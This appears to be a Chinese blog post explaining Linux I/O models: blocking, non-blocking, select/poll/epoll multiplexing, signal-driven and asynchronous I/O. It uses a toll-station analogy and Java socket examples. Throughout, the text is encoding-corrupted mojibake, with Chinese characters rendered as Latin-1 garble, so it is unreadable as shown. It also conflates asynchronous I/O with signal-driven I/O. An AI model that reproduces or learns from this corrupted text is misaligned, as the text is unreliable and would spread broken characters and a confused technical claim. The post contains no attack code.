<p>æ”¶è´¹ç«™æ¨¡å‹,  ä½ å¼€äº†ä¸€ä¸ªæ”¶è´¹ç«™ ,fdä¸º5,ä½ åœ¨åŠå…¬å®¤åŠå…¬,ç¦»æ”¶è´¹ç«™å¾ˆè¿œ,ä½ åªæœ‰ä¸€ä¸ªäºº, ç„¶åä½ è°ƒç”¨ss.accept(),æ—©æœŸlinuxå†…æ ¸ç›´æ¥è°ƒaccept(),ç„¶åä½ å°±å»æ”¶è´¹ç«™ç­‰ç€ç›´åˆ°æœ‰è·¯éœ€è¦ä¿®,ä½ æŠŠè·¯ä¿®å¥½,å¹¶æŠŠè·¯æ ‡è®°ä¸º6,ç„¶åä½ å†å›å»åŠå…¬å®¤,æ¥ç€ä½ è¯»åˆ°int len &#x3D; accept.getInputStream().read(buffer);(6.read()), ç„¶åä½ ç›´æ¥å»6å·è·¯çœ‹çœ‹è´§ç‰©æœ‰æ²¡æœ‰å‡†å¤‡å¥½,æ²¡å‡†å¤‡å¥½ä½ å°±ä¸€ç›´ç­‰,ç­‰åˆ°äº†ç„¶åä½ å†æŠŠè´§ç‰©æ¬åˆ°ä½ çš„åŠå…¬å®¤,ç„¶åå†å¤„ç†;</p>
<p>é˜»å¡å¤šçº¿ç¨‹</p>
<p>æ”¶è´¹ç«™æ¨¡å‹,  ä½ å¼€äº†ä¸€ä¸ªæ”¶è´¹ç«™ ,fdä¸º5,ä½ åœ¨åŠå…¬å¸åŠå…¬,ç¦»æ”¶è´¹ç«™å¾ˆè¿œ,ä½ å¯ä»¥è¯·äººå·¥ä½œ, ç„¶åä½ è°ƒç”¨ss.accept(),æ—©æœŸlinuxå†…æ ¸ç›´æ¥è°ƒaccept(),ç„¶åä½ å°±å»æ”¶è´¹ç«™ç­‰ç€ç›´åˆ°æœ‰è·¯éœ€è¦ä¿®,fd6ä½ æŠŠè·¯ä¿®å¥½,ç„¶åè¯·ä¸€ä¸ªå·¥äººï¼ˆçº¿ç¨‹ï¼‰çœ‹ç€è¿™6å·è·¯,æ¥ç€è¿™ä¸ªäººè¯»åˆ°int len &#x3D; accept.getInputStream().read(buffer);(6.read()), ç„¶åä»–ç›´æ¥å»6å·è·¯çœ‹çœ‹è´§ç‰©æœ‰æ²¡æœ‰å‡†å¤‡å¥½,æ²¡å‡†å¤‡å¥½ä»–å°±ä¸€ç›´ç­‰,ç­‰åˆ°äº†ç„¶åä»–å†æŠŠè´§ç‰©æ¬åˆ°ä½ çš„åŠå…¬å®¤,ç„¶åå†å¤„ç†; æœŸé—´ä½ å¯ä»¥å»å¹²åˆ«çš„äº‹;</p>
<p>éé˜»å¡</p>
<p>æ”¶è´¹ç«™æ¨¡å‹, ä½ åœ¨åŠå…¬å®¤åŠå…¬,ç¦»æ”¶è´¹ç«™æ¯”è¾ƒè¿œ, è°ƒç”¨ä¸€æ¬¡SocketChannel client &#x3D; ss.accept();(åº•å±‚æ˜¯accept)ä½ å°±å»æ”¶è´¹ç«™çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰è·¯è¦åŠ è¿›æ¥,æœ‰çš„è¯ä½ æŠŠè·¯åŠ è¿›æ¥, ç„¶åä½ åˆè·‘å›åŠå…¬å®¤åšå¹²åˆ«çš„äº‹æƒ…,æ²¡æœ‰çš„è¯ä½ ç›´æ¥å›å»å¹²åˆ«çš„äº‹æƒ…, ç„¶åæ‰§è¡Œåˆ°int num &#x3D; c.read(byteBuffer);  ä½ å»æ”¶è´¹ç«™çœ‹å¯¹åº”çš„è·¯æ˜¯å¦æœ‰è´§æ¥äº†,æœ‰çš„è¯ä½ å¤„ç†ä¸€ä¸‹, ä½ å¾—æŠŠè´§ç‰©æ¬åˆ°è‡ªå·±çš„åŠå…¬å®¤, ç„¶åä½ å†å¯¹è´§ç‰©è¿›è¡Œå¤„ç†, å¤„ç†å®Œäº†å†æ‰§è¡Œåˆ°int num &#x3D; c.read(byteBuffer),ä½ åˆé‡å¤åˆšåˆšçš„åŠæ³•; ç›´åˆ°æŠŠæ‰€æœ‰å·²æ³¨å†Œçš„è·¯å¤„ç†å®Œ,ç„¶ååˆæ‰§è¡ŒSocketChannel client &#x3D; ss.accept();  å…¶å®å¤šè·‘äº†å¾ˆå¤šèººè·¯; æ˜æ˜å¯ä»¥ä¸€æ¬¡æ€§çœ‹é‚£æ¡è·¯å¥½äº†,ç„¶åå»å¤„ç†é‚£ä¸€æ¡è·¯å°±å¯ä»¥,ä¸ç”¨æ¯ä¸€æ¡è·¯éƒ½å»çœ‹ä¸€ä¸‹;</p>
<p>é˜»å¡å¤šè·¯å¤ç”¨å™¨pollå•çº¿ç¨‹ï¼ˆè®©linuxå¸®ä½ çœ‹ï¼Œä½†æ˜¯ä¼šæœ‰C10Ké—®é¢˜ï¼Œlinuxå¾ˆå‚»è®°ä¸ä½ï¼Œæ¯æ¬¡é‡æ–°éå†ï¼Œè€Œä¸æ˜¯è‡ªå·±çœ‹ï¼‰</p>
<p>æ”¶è´¹ç«™æ¨¡å‹,  ä½ å¼€äº†ä¸€ä¸ªæ”¶è´¹ç«™ ,fdä¸º5,ä½ åœ¨åŠå…¬å®¤åŠå…¬,ç¦»æ”¶è´¹ç«™å¾ˆè¿œ,ä½ åªæœ‰ä¸€ä¸ªäºº, ç„¶åä½ è°ƒç”¨ss.accept(),linuxå†…æ ¸ç›´æ¥è°ƒpoll(),è¿™ä¸ªpollç›¸å½“äºä¸€ä¸ªäºº(ä»–å°±ä½åœ¨æ”¶è´¹ç«™), ä½ è·‘åˆ°æ”¶è´¹ç«™,æŠŠæ”¶è´¹ç«™å·å‘Šè¯‰ä»–,ç„¶åä»–å°±å»å„ä¸ªæ”¶è´¹ç«™çœ‹æœ‰æ²¡æœ‰éœ€è¦ä¿®çš„è·¯(ä½†æ˜¯è¿™ä¸ªäººæ²¡æœ‰è®°å¿†,æ¯æ¬¡éƒ½ä¼šå…¨çœ‹ä¸€é,ä¸ä¼šè®°å½•çŠ¶æ€,å¾ˆå‚»),æ²¡æœ‰æˆ–è€…æœ‰éƒ½å‘Šè¯‰ä½ (æœŸé—´ä½ å¾—åœ¨æ”¶è´¹ç«™ç­‰ç€),ä½ æ¥ç€å°±è°ƒç”¨acceptæ¥ä¿®è·¯,ä¿®å¥½è·¯å¹¶ä¸”ç»™ä¸ªè·¯å·6;,ç„¶åä½ å›å»,è¯»åˆ°6.read(),ä½ å°±å»6å·è·¯ç­‰ç€,ç›´åˆ°æœ‰è´§ç‰©ç„¶åæ¬å›æ¥;</p>
<p>éé˜»å¡å¤šè·¯å¤ç”¨å•çº¿ç¨‹epoll</p>
<p>è®©é‚£ä¸ªä½åœ¨æ”¶è´¹ç«™çš„äºº(å†…æ ¸)ç•™ä¸ªå°æœ¬æœ¬,å°†æ‰€æœ‰æ³¨å†Œçš„fdç»„ç»‡æˆçº¢é»‘æ ‘, ç„¶åæ¥ä¸ªé“¾è¡¨è®°å½•</p>
<h2 id="Readå’ŒWriteç³»ç»Ÿè°ƒç”¨"><a href="#Readå’ŒWriteç³»ç»Ÿè°ƒç”¨" class="headerlink" title="Readå’ŒWriteç³»ç»Ÿè°ƒç”¨"></a>Readå’ŒWriteç³»ç»Ÿè°ƒç”¨</h2><p>readç³»ç»Ÿè°ƒç”¨: å°†æ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°ç”¨æˆ·ç¼“å†²åŒº</p>
<p>writeç³»ç»Ÿè°ƒç”¨: å°†æ•°æ®ä»ç”¨æˆ·ç¼“å†²åŒºå¤åˆ¶åˆ°å†…æ ¸ç¼“å†²åŒº</p>
<p>è¿™ä¸ªä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œéƒ½ä¸è´Ÿè´£æ•°æ®åœ¨å†…æ ¸ç¼“å†²åŒºå’Œç£ç›˜ä¹‹é—´çš„äº¤æ¢ã€‚åº•å±‚çš„è¯»å†™äº¤æ¢ï¼Œæ˜¯ç”±æ“ä½œç³»ç»Ÿkernelå†…æ ¸å®Œæˆçš„ã€‚</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848274.png" alt="img"></p>
<p>ä¸€ä¸ªå…¸å‹Java æœåŠ¡ç«¯å¤„ç†ç½‘ç»œè¯·æ±‚çš„å…¸å‹è¿‡ç¨‹ï¼š</p>
<p>ï¼ˆ1ï¼‰å®¢æˆ·ç«¯è¯·æ±‚</p>
<p>Linuxé€šè¿‡ç½‘å¡ï¼Œè¯»å–å®¢æˆ·æ–­çš„è¯·æ±‚æ•°æ®ï¼Œå°†æ•°æ®è¯»å–åˆ°å†…æ ¸ç¼“å†²åŒºã€‚</p>
<p>ï¼ˆ2ï¼‰è·å–è¯·æ±‚æ•°æ®</p>
<p>æœåŠ¡å™¨ä»å†…æ ¸ç¼“å†²åŒºè¯»å–æ•°æ®åˆ°Javaè¿›ç¨‹ç¼“å†²åŒºã€‚</p>
<p>ï¼ˆ3ï¼‰æœåŠ¡å™¨ç«¯ä¸šåŠ¡å¤„ç†</p>
<p>JavaæœåŠ¡ç«¯åœ¨è‡ªå·±çš„ç”¨æˆ·ç©ºé—´ä¸­ï¼Œå¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚</p>
<p>ï¼ˆ4ï¼‰æœåŠ¡å™¨ç«¯è¿”å›æ•°æ®</p>
<p>JavaæœåŠ¡ç«¯å·²æ„å»ºå¥½çš„å“åº”ï¼Œä»ç”¨æˆ·ç¼“å†²åŒºå†™å…¥ç³»ç»Ÿç¼“å†²åŒºã€‚</p>
<p>ï¼ˆ5ï¼‰å‘é€ç»™å®¢æˆ·ç«¯</p>
<p>Linuxå†…æ ¸é€šè¿‡ç½‘ç»œ I&#x2F;O ï¼Œå°†å†…æ ¸ç¼“å†²åŒºä¸­çš„æ•°æ®ï¼Œå†™å…¥ç½‘å¡ï¼Œç½‘å¡é€šè¿‡åº•å±‚çš„é€šè®¯åè®®ï¼Œä¼šå°†æ•°æ®å‘é€ç»™ç›®æ ‡å®¢æˆ·ç«¯ã€‚</p>
<h2 id="Linuxäº”ç§IOæ¨¡å‹"><a href="#Linuxäº”ç§IOæ¨¡å‹" class="headerlink" title="Linuxäº”ç§IOæ¨¡å‹"></a>Linuxäº”ç§IOæ¨¡å‹</h2><p>å‰4ç§éƒ½æ˜¯åŒæ­¥çš„</p>
<p>é˜»å¡å¼I&#x2F;O<br>éé˜»å¡å¼I&#x2F;O<br>I&#x2F;Oå¤ç”¨ï¼ˆselectï¼Œpollï¼Œepollç­‰ï¼‰<br>ä¿¡å·é©±åŠ¨å¼I&#x2F;Oï¼ˆSIGIOï¼‰<br>å¼‚æ­¥I&#x2F;Oï¼ˆPOSIXçš„aio_ç³»åˆ—å‡½æ•°ï¼‰</p>
<h3 id="ä¿¡å·é©±åŠ¨å¼IO"><a href="#ä¿¡å·é©±åŠ¨å¼IO" class="headerlink" title="ä¿¡å·é©±åŠ¨å¼IO"></a>ä¿¡å·é©±åŠ¨å¼IO</h3><p>å…è®¸Socketè¿›è¡Œä¿¡å·é©±åŠ¨IO,å¹¶æ³¨å†Œä¸€ä¸ªä¿¡å·å¤„ç†å‡½æ•°ï¼Œè¿›ç¨‹ç»§ç»­è¿è¡Œå¹¶ä¸é˜»å¡ã€‚å½“æ•°æ®å‡†å¤‡å¥½æ—¶ï¼Œè¿›ç¨‹ä¼šæ”¶åˆ°ä¸€ä¸ªSIGIOä¿¡å·ï¼Œå¯ä»¥åœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­è°ƒç”¨I&#x2F;Oæ“ä½œå‡½æ•°å¤„ç†æ•°æ®ã€‚å¦‚ä¸‹å›¾ï¼š<br><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848311.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p>
<h3 id="åŒæ­¥é˜»å¡IO-Blocking-IO"><a href="#åŒæ­¥é˜»å¡IO-Blocking-IO" class="headerlink" title="åŒæ­¥é˜»å¡IO(Blocking IO)"></a>åŒæ­¥é˜»å¡IO(Blocking IO)</h3><p>åŒæ­¥é˜»å¡ IO æ¨¡å‹æ˜¯æœ€å¸¸ç”¨çš„ä¸€ä¸ªæ¨¡å‹ï¼Œä¹Ÿæ˜¯æœ€ç®€å•çš„æ¨¡å‹ã€‚åœ¨linuxä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹æ‰€æœ‰çš„socketéƒ½æ˜¯blockingã€‚å®ƒç¬¦åˆäººä»¬æœ€å¸¸è§çš„æ€è€ƒé€»è¾‘ã€‚é˜»å¡å°±æ˜¯è¿›ç¨‹ â€œè¢«â€ ä¼‘æ¯, CPUå¤„ç†å…¶å®ƒè¿›ç¨‹å»äº†ã€‚</p>
<h3 id="åŒæ­¥éé˜»å¡-None-Blocking-IO"><a href="#åŒæ­¥éé˜»å¡-None-Blocking-IO" class="headerlink" title="åŒæ­¥éé˜»å¡(None Blocking IO)"></a>åŒæ­¥éé˜»å¡(None Blocking IO)</h3><p>NIOæ¨¡å‹åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œä¹Ÿæ˜¯ä¸å¯ç”¨çš„ã€‚ä¸€èˆ¬ Web æœåŠ¡å™¨ä¸ä½¿ç”¨è¿™ç§ IO æ¨¡å‹ã€‚ä¸€èˆ¬å¾ˆå°‘ç›´æ¥ä½¿ç”¨è¿™ç§æ¨¡å‹ï¼Œè€Œæ˜¯åœ¨å…¶ä»–IOæ¨¡å‹ä¸­ä½¿ç”¨éé˜»å¡IOè¿™ä¸€ç‰¹æ€§ã€‚javaçš„å®é™…å¼€å‘ä¸­ï¼Œä¹Ÿä¸ä¼šæ¶‰åŠè¿™ç§IOæ¨¡å‹ã€‚</p>
<h3 id="IOå¤šè·¯å¤ç”¨æ¨¡å‹-I-x2F-O-multiplexingï¼‰"><a href="#IOå¤šè·¯å¤ç”¨æ¨¡å‹-I-x2F-O-multiplexingï¼‰" class="headerlink" title="IOå¤šè·¯å¤ç”¨æ¨¡å‹(I&#x2F;O multiplexingï¼‰"></a>IOå¤šè·¯å¤ç”¨æ¨¡å‹(I&#x2F;O multiplexingï¼‰</h3><p>IOå¤šè·¯å¤ç”¨æ¨¡å‹ï¼Œå°±æ˜¯é€šè¿‡ä¸€ç§æ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥ç›‘è§†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œä¸€æ—¦æŸä¸ªæè¿°ç¬¦å°±ç»ªï¼ˆä¸€èˆ¬æ˜¯å†…æ ¸ç¼“å†²åŒºå¯è¯»&#x2F;å¯å†™ï¼‰ï¼Œå†…æ ¸kernelèƒ½å¤Ÿé€šçŸ¥ç¨‹åºè¿›è¡Œç›¸åº”çš„IOç³»ç»Ÿè°ƒç”¨ã€‚</p>
<p>ç›®å‰æ”¯æŒIOå¤šè·¯å¤ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæœ‰ selectï¼Œpollï¼Œepollç­‰ç­‰ã€‚selectç³»ç»Ÿè°ƒç”¨ï¼Œæ˜¯ç›®å‰å‡ ä¹åœ¨æ‰€æœ‰çš„æ“ä½œç³»ç»Ÿä¸Šéƒ½æœ‰æ”¯æŒï¼Œå…·æœ‰è‰¯å¥½è·¨å¹³å°ç‰¹æ€§ã€‚epollæ˜¯åœ¨linux 2.6å†…æ ¸ä¸­æå‡ºçš„ï¼Œæ˜¯selectï¼Œpollç³»ç»Ÿè°ƒç”¨çš„linuxå¢å¼ºç‰ˆæœ¬ã€‚</p>
<p>IOå¤šè·¯å¤ç”¨æ¨¡å‹çš„åŸºæœ¬åŸç†å°±æ˜¯select&#x2F;poll&#x2F;epollç³»ç»Ÿè°ƒç”¨ï¼Œå•ä¸ªçº¿ç¨‹ä¸æ–­çš„è½®è¯¢select&#x2F;poll&#x2F;epollç³»ç»Ÿè°ƒç”¨æ‰€è´Ÿè´£çš„æˆç™¾ä¸Šåƒçš„socketè¿æ¥ï¼Œå½“æŸä¸ªæˆ–è€…æŸäº›socketç½‘ç»œè¿æ¥æœ‰æ•°æ®åˆ°è¾¾äº†ï¼Œå°±è¿”å›è¿™äº›å¯ä»¥è¯»å†™çš„è¿æ¥ã€‚å› æ­¤ï¼Œå¥½å¤„ä¹Ÿå°±æ˜¾è€Œæ˜“è§äº†â€”â€”é€šè¿‡ä¸€æ¬¡select&#x2F;poll&#x2F;epollç³»ç»Ÿè°ƒç”¨ï¼Œå°±æŸ¥è¯¢åˆ°åˆ°å¯ä»¥è¯»å†™çš„ä¸€ä¸ªç”šè‡³æ˜¯æˆç™¾ä¸Šåƒçš„ç½‘ç»œè¿æ¥ã€‚</p>
<p>ä¸¾ä¸ªæ —å­ã€‚å‘èµ·ä¸€ä¸ªå¤šè·¯å¤ç”¨IOçš„çš„readè¯»æ“ä½œç³»ç»Ÿè°ƒç”¨ï¼Œæµç¨‹æ˜¯è¿™ä¸ªæ ·å­ï¼š</p>
<p>[<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848325.jpeg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œé¦–å…ˆä¸æ˜¯è¿›è¡Œreadç³»ç»Ÿè°ƒåŠ¨ï¼Œè€Œæ˜¯è¿›è¡Œselect&#x2F;poll&#x2F;epollç³»ç»Ÿè°ƒç”¨ã€‚å½“ç„¶ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå‰æï¼Œéœ€è¦å°†ç›®æ ‡ç½‘ç»œè¿æ¥ï¼Œæå‰æ³¨å†Œåˆ°select&#x2F;poll&#x2F;epollçš„å¯æŸ¥è¯¢socketåˆ—è¡¨ä¸­ã€‚ç„¶åï¼Œæ‰å¯ä»¥å¼€å¯æ•´ä¸ªçš„IOå¤šè·¯å¤ç”¨æ¨¡å‹çš„è¯»æµç¨‹ã€‚</p>
<p>ï¼ˆ1ï¼‰è¿›è¡Œselect&#x2F;epollç³»ç»Ÿè°ƒç”¨ï¼ŒæŸ¥è¯¢å¯ä»¥è¯»çš„è¿æ¥ã€‚kernelä¼šæŸ¥è¯¢æ‰€æœ‰selectçš„å¯æŸ¥è¯¢socketåˆ—è¡¨ï¼Œå½“ä»»ä½•ä¸€ä¸ªsocketä¸­çš„æ•°æ®å‡†å¤‡å¥½äº†ï¼Œselectå°±ä¼šè¿”å›ã€‚</p>
<p>å½“ç”¨æˆ·è¿›ç¨‹è°ƒç”¨äº†selectï¼Œé‚£ä¹ˆæ•´ä¸ªçº¿ç¨‹ä¼šè¢«blockï¼ˆé˜»å¡æ‰ï¼‰ã€‚</p>
<p>ï¼ˆ2ï¼‰ç”¨æˆ·çº¿ç¨‹è·å¾—äº†ç›®æ ‡è¿æ¥åï¼Œå‘èµ·readç³»ç»Ÿè°ƒç”¨ï¼Œç”¨æˆ·çº¿ç¨‹é˜»å¡ã€‚å†…æ ¸å¼€å§‹å¤åˆ¶æ•°æ®ã€‚å®ƒå°±ä¼šå°†æ•°æ®ä»kernelå†…æ ¸ç¼“å†²åŒºï¼Œæ‹·è´åˆ°ç”¨æˆ·ç¼“å†²åŒºï¼ˆç”¨æˆ·å†…å­˜ï¼‰ï¼Œç„¶åkernelè¿”å›ç»“æœã€‚</p>
<p>ï¼ˆ3ï¼‰ç”¨æˆ·çº¿ç¨‹æ‰è§£é™¤blockçš„çŠ¶æ€ï¼Œç”¨æˆ·çº¿ç¨‹ç»ˆäºçœŸæ­£è¯»å–åˆ°æ•°æ®ï¼Œç»§ç»­æ‰§è¡Œã€‚</p>
<p>å¤šè·¯å¤ç”¨IOçš„ç‰¹ç‚¹ï¼š</p>
<p>IOå¤šè·¯å¤ç”¨æ¨¡å‹ï¼Œå»ºç«‹åœ¨æ“ä½œç³»ç»Ÿkernelå†…æ ¸èƒ½å¤Ÿæä¾›çš„å¤šè·¯å¤ç”¨ç³»ç»Ÿè°ƒç”¨select&#x2F;poll&#x2F;epollåŸºç¡€ä¹‹ä¸Šçš„ã€‚å¤šè·¯å¤ç”¨IOéœ€è¦ç”¨åˆ°ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ï¼Œ ä¸€ä¸ªselect&#x2F;poll&#x2F;epollæŸ¥è¯¢è°ƒç”¨ï¼Œä¸€ä¸ªæ˜¯IOçš„è¯»å–è°ƒç”¨ã€‚</p>
<p>å’ŒNIOæ¨¡å‹ç›¸ä¼¼ï¼Œå¤šè·¯å¤ç”¨IOéœ€è¦è½®è¯¢ã€‚è´Ÿè´£select&#x2F;poll&#x2F;epollæŸ¥è¯¢è°ƒç”¨çš„çº¿ç¨‹ï¼Œéœ€è¦ä¸æ–­çš„è¿›è¡Œselect&#x2F;epollè½®è¯¢ï¼ŒæŸ¥æ‰¾å‡ºå¯ä»¥è¿›è¡ŒIOæ“ä½œçš„è¿æ¥ã€‚</p>
<p>å¦å¤–ï¼Œå¤šè·¯å¤ç”¨IOæ¨¡å‹ä¸å‰é¢çš„NIOæ¨¡å‹ï¼Œæ˜¯æœ‰å…³ç³»çš„ã€‚å¯¹äºæ¯ä¸€ä¸ªå¯ä»¥æŸ¥è¯¢çš„socketï¼Œä¸€èˆ¬éƒ½è®¾ç½®æˆä¸ºnon-blockingæ¨¡å‹ã€‚åªæ˜¯è¿™ä¸€ç‚¹ï¼Œå¯¹äºç”¨æˆ·ç¨‹åºæ˜¯é€æ˜çš„ï¼ˆä¸æ„ŸçŸ¥ï¼‰ã€‚</p>
<p>å¤šè·¯å¤ç”¨IOçš„ä¼˜ç‚¹ï¼š</p>
<p>ç”¨select&#x2F;poll&#x2F;epollçš„ä¼˜åŠ¿åœ¨äºï¼Œå®ƒå¯ä»¥åŒæ—¶å¤„ç†æˆåƒä¸Šä¸‡ä¸ªè¿æ¥ï¼ˆconnectionï¼‰ã€‚ä¸ä¸€æ¡çº¿ç¨‹ç»´æŠ¤ä¸€ä¸ªè¿æ¥ç›¸æ¯”ï¼ŒI&#x2F;Oå¤šè·¯å¤ç”¨æŠ€æœ¯çš„æœ€å¤§ä¼˜åŠ¿æ˜¯ï¼šç³»ç»Ÿä¸å¿…åˆ›å»ºçº¿ç¨‹ï¼Œä¹Ÿä¸å¿…ç»´æŠ¤è¿™äº›çº¿ç¨‹ï¼Œä»è€Œå¤§å¤§å‡å°äº†ç³»ç»Ÿçš„å¼€é”€ã€‚</p>
<p>Javaçš„NIOï¼ˆnew IOï¼‰æŠ€æœ¯ï¼Œä½¿ç”¨çš„å°±æ˜¯IOå¤šè·¯å¤ç”¨æ¨¡å‹ã€‚åœ¨linuxç³»ç»Ÿä¸Šï¼Œä½¿ç”¨çš„æ˜¯epollç³»ç»Ÿè°ƒç”¨ã€‚</p>
<p>å¤šè·¯å¤ç”¨IOçš„ç¼ºç‚¹ï¼š</p>
<p>æœ¬è´¨ä¸Šï¼Œselect&#x2F;poll&#x2F;epollç³»ç»Ÿè°ƒç”¨ï¼Œå±äºåŒæ­¥IOï¼Œä¹Ÿæ˜¯é˜»å¡IOã€‚éƒ½éœ€è¦åœ¨è¯»å†™äº‹ä»¶å°±ç»ªåï¼Œè‡ªå·±è´Ÿè´£è¿›è¡Œè¯»å†™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè¯»å†™è¿‡ç¨‹æ˜¯é˜»å¡çš„ã€‚</p>
<p>å¦‚ä½•å……åˆ†çš„è§£é™¤çº¿ç¨‹çš„é˜»å¡å‘¢ï¼Ÿé‚£å°±æ˜¯å¼‚æ­¥IOæ¨¡å‹ã€‚</p>
<h3 id="å¼‚æ­¥IOæ¨¡å‹ï¼ˆasynchronous-IOï¼‰"><a href="#å¼‚æ­¥IOæ¨¡å‹ï¼ˆasynchronous-IOï¼‰" class="headerlink" title="å¼‚æ­¥IOæ¨¡å‹ï¼ˆasynchronous IOï¼‰"></a>å¼‚æ­¥IOæ¨¡å‹ï¼ˆasynchronous IOï¼‰</h3><p>å¦‚ä½•è¿›ä¸€æ­¥æå‡æ•ˆç‡ï¼Œè§£é™¤æœ€åä¸€ç‚¹é˜»å¡å‘¢ï¼Ÿè¿™å°±æ˜¯å¼‚æ­¥IOæ¨¡å‹ï¼Œå…¨ç§°asynchronous I&#x2F;Oï¼Œç®€ç§°ä¸ºAIOã€‚</p>
<p>AIOçš„åŸºæœ¬æµç¨‹æ˜¯ï¼šç”¨æˆ·çº¿ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼Œå‘ŠçŸ¥kernelå†…æ ¸å¯åŠ¨æŸä¸ªIOæ“ä½œï¼Œç”¨æˆ·çº¿ç¨‹è¿”å›ã€‚kernelå†…æ ¸åœ¨æ•´ä¸ªIOæ“ä½œï¼ˆåŒ…æ‹¬æ•°æ®å‡†å¤‡ã€æ•°æ®å¤åˆ¶ï¼‰å®Œæˆåï¼Œé€šçŸ¥ç”¨æˆ·ç¨‹åºï¼Œç”¨æˆ·æ‰§è¡Œåç»­çš„ä¸šåŠ¡æ“ä½œã€‚</p>
<p>kernelçš„æ•°æ®å‡†å¤‡æ˜¯å°†æ•°æ®ä»ç½‘ç»œç‰©ç†è®¾å¤‡ï¼ˆç½‘å¡ï¼‰è¯»å–åˆ°å†…æ ¸ç¼“å†²åŒºï¼›kernelçš„æ•°æ®å¤åˆ¶æ˜¯å°†æ•°æ®ä»å†…æ ¸ç¼“å†²åŒºæ‹·è´åˆ°ç”¨æˆ·ç¨‹åºç©ºé—´çš„ç¼“å†²åŒºã€‚</p>
<p>[<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848327.jpeg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ï¼ˆ1ï¼‰å½“ç”¨æˆ·çº¿ç¨‹è°ƒç”¨äº†readç³»ç»Ÿè°ƒç”¨ï¼Œç«‹åˆ»å°±å¯ä»¥å¼€å§‹å»åšå…¶å®ƒçš„äº‹ï¼Œç”¨æˆ·çº¿ç¨‹ä¸é˜»å¡ã€‚</p>
<p>ï¼ˆ2ï¼‰å†…æ ¸ï¼ˆkernelï¼‰å°±å¼€å§‹äº†IOçš„ç¬¬ä¸€ä¸ªé˜¶æ®µï¼šå‡†å¤‡æ•°æ®ã€‚å½“kernelä¸€ç›´ç­‰åˆ°æ•°æ®å‡†å¤‡å¥½äº†ï¼Œå®ƒå°±ä¼šå°†æ•°æ®ä»kernelå†…æ ¸ç¼“å†²åŒºï¼Œæ‹·è´åˆ°ç”¨æˆ·ç¼“å†²åŒºï¼ˆç”¨æˆ·å†…å­˜ï¼‰ã€‚</p>
<p>ï¼ˆ3ï¼‰kernelä¼šç»™ç”¨æˆ·çº¿ç¨‹å‘é€ä¸€ä¸ªä¿¡å·ï¼ˆsignalï¼‰ï¼Œæˆ–è€…å›è°ƒç”¨æˆ·çº¿ç¨‹æ³¨å†Œçš„å›è°ƒæ¥å£ï¼Œå‘Šè¯‰ç”¨æˆ·çº¿ç¨‹readæ“ä½œå®Œæˆäº†ã€‚</p>
<p>ï¼ˆ4ï¼‰ç”¨æˆ·çº¿ç¨‹è¯»å–ç”¨æˆ·ç¼“å†²åŒºçš„æ•°æ®ï¼Œå®Œæˆåç»­çš„ä¸šåŠ¡æ“ä½œã€‚</p>
<p>å¼‚æ­¥IOæ¨¡å‹çš„ç‰¹ç‚¹ï¼š</p>
<p>åœ¨å†…æ ¸kernelçš„ç­‰å¾…æ•°æ®å’Œå¤åˆ¶æ•°æ®çš„ä¸¤ä¸ªé˜¶æ®µï¼Œç”¨æˆ·çº¿ç¨‹éƒ½ä¸æ˜¯block(é˜»å¡)çš„ã€‚ç”¨æˆ·çº¿ç¨‹éœ€è¦æ¥å—kernelçš„IOæ“ä½œå®Œæˆçš„äº‹ä»¶ï¼Œæˆ–è€…è¯´æ³¨å†ŒIOæ“ä½œå®Œæˆçš„å›è°ƒå‡½æ•°ï¼Œåˆ°æ“ä½œç³»ç»Ÿçš„å†…æ ¸ã€‚æ‰€ä»¥è¯´ï¼Œå¼‚æ­¥IOæœ‰çš„æ—¶å€™ï¼Œä¹Ÿå«åšä¿¡å·é©±åŠ¨ IO ã€‚</p>
<p>å¼‚æ­¥IOæ¨¡å‹ç¼ºç‚¹ï¼š</p>
<p>éœ€è¦å®Œæˆäº‹ä»¶çš„æ³¨å†Œä¸ä¼ é€’ï¼Œè¿™é‡Œè¾¹éœ€è¦åº•å±‚æ“ä½œç³»ç»Ÿæä¾›å¤§é‡çš„æ”¯æŒï¼Œå»åšå¤§é‡çš„å·¥ä½œã€‚</p>
<p>ç›®å‰æ¥è¯´ï¼Œ Windows ç³»ç»Ÿä¸‹é€šè¿‡ IOCP å®ç°äº†çœŸæ­£çš„å¼‚æ­¥ I&#x2F;Oã€‚ä½†æ˜¯ï¼Œå°±ç›®å‰çš„ä¸šç•Œå½¢å¼æ¥è¯´ï¼ŒWindows ç³»ç»Ÿï¼Œå¾ˆå°‘ä½œä¸ºç™¾ä¸‡çº§ä»¥ä¸Šæˆ–è€…è¯´é«˜å¹¶å‘åº”ç”¨çš„æœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ¥ä½¿ç”¨ã€‚</p>
